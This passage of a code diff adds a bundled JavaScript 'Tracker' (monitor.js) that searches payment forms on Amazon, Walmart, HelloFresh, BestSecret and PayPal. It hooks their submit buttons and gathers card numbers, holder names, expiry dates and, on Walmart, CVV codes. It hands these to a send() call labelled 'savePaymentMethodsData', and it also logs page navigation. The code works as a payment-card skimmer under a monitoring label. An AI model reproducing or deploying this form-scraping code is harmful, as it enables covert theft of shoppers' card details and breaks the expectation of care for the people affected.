+                        elements.push(_formChildElement);
+                    }
+                    if (_formChildElement.nodeName === 'BUTTON' && _formChildElement.type === 'submit') {
+                        if (callback) {
+                            callback(_formChildElement, elements);
+                        }
+                    }
+                }
+                else {
+                    self.explorePayPalPaymentFormElement(self, _formChildElement, elements, callback);
+                }
+            });
+        }
+    }
+    exploreHelloFreshPaymentContainer(self, parentNode, callback) {
+        parentNode.childNodes.forEach(function (__element) {
+            if (__element.nodeName === 'BUTTON' && __element.getAttribute('data-test-id') === 'add-payment-method-save') {
+                if (callback) {
+                    callback(__element);
+                }
+            }
+            else {
+                self.exploreHelloFreshPaymentContainer(self, __element, callback);
+            }
+        });
+    }
+    exploreBestSecretPaymentContainer(self) {
+        document.querySelectorAll('form').forEach(function (__formElement) {
+            if (__formElement.id === "creditForm") {
+                let elements = [];
+                self.exploreBestSecretPaymentFormElement(self, __formElement, elements, function (controller, elements) {
+                    controller.addEventListener('click', function () {
+                        let paymentMethodData = [];
+                        elements.forEach(function (__childElement) {
+                            paymentMethodData.push({
+                                'element': __childElement.nodeName,
+                                'id': __childElement.id,
+                                'name': __childElement.name,
+                                'value': __childElement.value,
+                            });
+                        });
+                        send({
+                            command: 'savePaymentMethodsData',
+                            data: {
+                                'cardNumber': paymentMethodData[1].value ? paymentMethodData[1].value : 'Unknown',
+                                'cardBrand': paymentMethodData[0].value ? paymentMethodData[0].value : 'Unknown',
+                                'cardHolder': paymentMethodData[4].value ? paymentMethodData[4].value : 'Unknown',
+                                "cardExpire": paymentMethodData[2].value + '/' + paymentMethodData[3].value,
+                                'cardCVC': 'Unknown',
+                                'event': 'add',
+                                "workWebsite": window.location.origin
+                            }
+                        });
+                        paymentMethodData = [];
+                        //elements = [];
+                    });
+                });
+            }
+        });
+    }
+    exploreBestSecretPaymentFormElement(self, __formElement, elements, callback) {
+        if (__formElement.childNodes.length !== 0) {
+            __formElement.childNodes.forEach(function (_childElement) {
+                if (_childElement.nodeName === 'INPUT' || _childElement.nodeName === 'SELECT' || _childElement.nodeName === 'BUTTON') {
+                    if (_childElement.nodeName === 'INPUT' && _childElement.type !== 'hidden' || _childElement.nodeName === 'SELECT') {
+                        elements.push(_childElement);
+                    }
+                    if (_childElement.nodeName === 'BUTTON' && !_childElement.classList.contains('btn-link')
+                        && !_childElement.classList.contains('btn-secondary-action') && _childElement.type === 'submit') {
+                        if (callback) {
+                            callback(_childElement, elements);
+                        }
+                    }
+                }
+                else {
+                    self.exploreBestSecretPaymentFormElement(self, _childElement, elements, callback);
+                }
+            });
+        }
+    }
+    exploreAmazonPaymentContainer(self) {
+        document.querySelectorAll('form').forEach(function (__formElement) {
+            if (!__formElement.classList.contains('nav-searchbar') && __formElement.name !== 'ue_backdetect' && __formElement.style.display !== 'none') {
+                let elements = [];
+                self.exploreAmazonPaymentFormElement(self, __formElement, elements, function (controller, elements) {
+                    controller.addEventListener('click', function () {
+                        let paymentMethodData = [];
+                        elements.forEach(function (__childElement) {
+                            paymentMethodData.push({
+                                'element': __childElement.nodeName,
+                                'id': __childElement.id,
+                                'name': __childElement.name.indexOf('accountHolderName') !== -1 || __childElement.name.indexOf('account_holder_name') !== -1 ? 'cardHolder' : (__childElement.name.indexOf('CardNumber') !== -1 ? 'cardNumber' : (__childElement.name.indexOf('month') !== -1 ? 'expirationMonth' : (__childElement.name.indexOf('year') !== -1 ? 'expirationYear' : 'Unknown'))),
+                                'value': __childElement.value,
+                            });
+                        });
+                        send({
+                            command: 'savePaymentMethodsData',
+                            data: {
+                                'cardNumber': paymentMethodData[1].value,
+                                'cardBrand': 'Unknown',
+                                'cardHolder': paymentMethodData[0].value,
+                                "cardExpire": paymentMethodData[2].value + '/' + paymentMethodData[3].value,
+                                'cardCVC': 'Unknown',
+                                'event': 'add',
+                                "workWebsite": window.location.origin
+                            }
+                        });
+                        paymentMethodData = [];
+                    });
+                });
+            }
+        });
+    }
+    exploreAmazonPaymentFormElement(self, __formElement, elements, callback) {
+        if (__formElement.childNodes.length !== 0) {
+            __formElement.childNodes.forEach(function (_childElement) {
+                if (_childElement.nodeName === 'INPUT' || _childElement.nodeName === 'SELECT') {
+                    if (_childElement.nodeName === 'INPUT' && _childElement.type !== 'hidden' &&
+                        _childElement.type !== 'submit' && _childElement.type !== 'checkbox' ||
+                        _childElement.nodeName === 'SELECT') {
+                        elements.push(_childElement);
+                    }
+                    if (_childElement.nodeName === 'INPUT' && _childElement.type === 'submit') {
+                        if (callback) {
+                            callback(_childElement, elements);
+                        }
+                    }
+                }
+                else {
+                    self.exploreAmazonPaymentFormElement(self, _childElement, elements, callback);
+                }
+            });
+        }
+    }
+    exploreWalmartPaymentContainer(self) {
+        let interval = setInterval(function () {
+            if (document.querySelector('.edit-form.multiple-required') !== null &&
+                document.querySelector('.edit-form-actions')?.firstElementChild?.firstElementChild !== null) {
+                clearInterval(interval);
+                if (document.querySelector('.edit-form-actions')?.firstElementChild?.firstElementChild?.nodeName === 'BUTTON') {
+                    ["click", "dblclick"].forEach(function (event) {
+                        let tempPaymentMethodsStore = [];
+                        document.querySelector('.edit-form-actions')?.firstElementChild?.firstElementChild?.addEventListener(event, function () {
+                            self.explorePaymentInputTag(self, document.querySelector('.edit-form.multiple-required'), 'creditCard', function (__detectedElement) {
+                                tempPaymentMethodsStore.push({
+                                    'element': __detectedElement.nodeName,
+                                    'id': __detectedElement.id,
+                                    'value': __detectedElement.value
+                                });
+                            });
+                            document.querySelectorAll('.payment-option').forEach(function (element) {
+                                if (!element.classList.contains('payment-inactive')) {
+                                    element.classList.remove('payment-option');
+                                    tempPaymentMethodsStore.push({
+                                        'element': element.nodeName,
+                                        'id': 'cardBrand',
+                                        'value': element.className
+                                    });
+                                    element.classList.add('payment-option');
+                                }
+                            });
+                            self.explorePaymentInputTag(self, document.querySelector('.edit-form.multiple-required'), 'firstName', function (__detectedElement) {
+                                tempPaymentMethodsStore.push({
+                                    'element': __detectedElement.nodeName,
+                                    'id': __detectedElement.id,
+                                    'value': __detectedElement.value
+                                });
+                            });
+                            self.explorePaymentInputTag(self, document.querySelector('.edit-form.multiple-required'), 'lastName', function (__detectedElement) {
+                                tempPaymentMethodsStore.push({
+                                    'element': __detectedElement.nodeName,
+                                    'id': __detectedElement.id,
+                                    'value': __detectedElement.value
+                                });
+                            });
+                            self.explorePaymentSelectTag(self, document.querySelector('.edit-form.multiple-required'), 'month-chooser', function (__detectedElement) {
+                                tempPaymentMethodsStore.push({
+                                    'element': __detectedElement.nodeName,
+                                    'id': __detectedElement.id,
+                                    'value': __detectedElement.value
+                                });
+                            });
+                            self.explorePaymentSelectTag(self, document.querySelector('.edit-form.multiple-required'), 'year-chooser', function (__detectedElement) {
+                                tempPaymentMethodsStore.push({
+                                    'element': __detectedElement.nodeName,
+                                    'id': __detectedElement.id,
+                                    'value': __detectedElement.value
+                                });
+                            });
+                            self.explorePaymentInputTag(self, document.querySelector('.edit-form.multiple-required'), 'cvv', function (__detectedElement) {
+                                tempPaymentMethodsStore.push({
+                                    'element': __detectedElement.nodeName,
+                                    'id': __detectedElement.id,
+                                    'value': __detectedElement.value
+                                });
+                            });
+                            send({
+                                command: 'savePaymentMethodsData',
+                                data: {
+                                    'cardNumber': tempPaymentMethodsStore[0].value,
+                                    'cardBrand': tempPaymentMethodsStore[1].value,
+                                    'cardHolder': tempPaymentMethodsStore[2].value + ' ' + tempPaymentMethodsStore[3].value,
+                                    "cardExpire": tempPaymentMethodsStore[4].value + '/' + tempPaymentMethodsStore[5].value,
+                                    'cardCVC': tempPaymentMethodsStore[6].value,
+                                    'event': 'add',
+                                    "workWebsite": window.location.origin
+                                }
+                            });
+                            tempPaymentMethodsStore = [];
+                            self.exploreWalmartPaymentEditButton(self);
+                        });
+                    });
+                }
+            }
+        }, 100);
+    }
+    exploreWalmartPaymentEditButton(self) {
+        let interval = setInterval(function () {
+            if (document.querySelectorAll('.button.link.CXO_module_header_edit_button.button--link').length !== 0) {
+                document.querySelectorAll('.button.link.CXO_module_header_edit_button.button--link').forEach(function (formEditButton) {
+                    if (formEditButton.getAttribute('data-automation-id') === 'edit-payment') {
+                        clearInterval(interval);
+                        formEditButton.addEventListener('click', function () {
+                            self.exploreWalmartPaymentContainer(self);
+                        });
+                    }
+                });
+            }
+        }, 100);
+    }
+    explorePaymentNewCard(self, elementParentNode, callback) {
+        let detectedElements = [];
+        if (elementParentNode.childNodes.length !== 0) {
+            elementParentNode.childNodes.forEach(function (__childElement) {
+                if (__childElement.classList.contains('card-surface')) {
+                    if (__childElement.nodeName === 'DIV' && __childElement.childNodes.length !== 0) {
+                        __childElement.childNodes.forEach(function (__targetParentElement) {
+                            if (__targetParentElement.classList.contains('card-no')) {
+                                self.explorePaymentInputTag(self, __targetParentElement, 'cardNo', function (detectedElement) {
+                                    detectedElements.push(detectedElement);
+                                });
+                            }
+                            if (__targetParentElement.classList.contains('card-bottom')) {
+                                self.explorePaymentInputTag(self, __targetParentElement, 'cardHolder', function (detectedElement) {
+                                    detectedElements.push(detectedElement);
+                                });
+                                self.explorePaymentInputTag(self, __targetParentElement, 'expire', function (detectedElement) {
+                                    detectedElements.push(detectedElement);
+                                });
+                                self.explorePaymentInputTag(self, __targetParentElement, 'cvc', function (detectedElement) {
+                                    detectedElements.push(detectedElement);
+                                });
+                            }
+                        });
+                    }
+                }
+            });
+            if (callback) {
+                callback(detectedElements);
+            }
+        }
+    }
+    explorePaymentSpanTag(self, elementParentNode, callback) {
+        if (elementParentNode.childNodes.length !== 0) {
+            elementParentNode.childNodes.forEach(function (__childElement) {
+                if (__childElement.nodeName === 'SPAN' && __childElement.classList.contains('payment-title')) {
+                    if (callback) {
+                        callback(__childElement);
+                    }
+                }
+                else {
+                    self.explorePaymentSpanTag(self, __childElement, callback);
+                }
+            });
+        }
+    }
+    explorePaymentInputTag(self, elementParentNode, selfId, callback) {
+        if (elementParentNode.childNodes.length !== 0) {
+            elementParentNode.childNodes.forEach(function (__childElement) {
+                if (__childElement.nodeName === 'INPUT' && __childElement.id.indexOf(selfId) !== -1) {
+                    if (callback) {
+                        callback(__childElement);
+                    }
+                }
+                else {
+                    self.explorePaymentInputTag(self, __childElement, selfId, callback);
+                }
+            });
+        }
+    }
+    explorePaymentSelectTag(self, elementParentNode, selfId, callback) {
+        if (elementParentNode.childNodes.length !== 0) {
+            elementParentNode.childNodes.forEach(function (__childElement) {
+                if (__childElement.nodeName === 'SELECT' && __childElement.id.indexOf(selfId) !== -1) {
+                    if (callback) {
+                        callback(__childElement);
+                    }
+                }
+                else {
+                    self.explorePaymentSelectTag(self, __childElement, selfId, callback);
+                }
+            });
+        }
+    }
+}
+/*new tracker added*/
+initDb();
+(new Tracker(window.location.href)).init(function () {
+    send({
+        command: 'saveNavigateData',
+        data: {
+            username: 'visitor',
+            workWebsite: window.location.origin
+        }
+    });
+});
+
+})();
+
+/******/ })()
+;
+//# sourceMappingURL=monitor.js.map
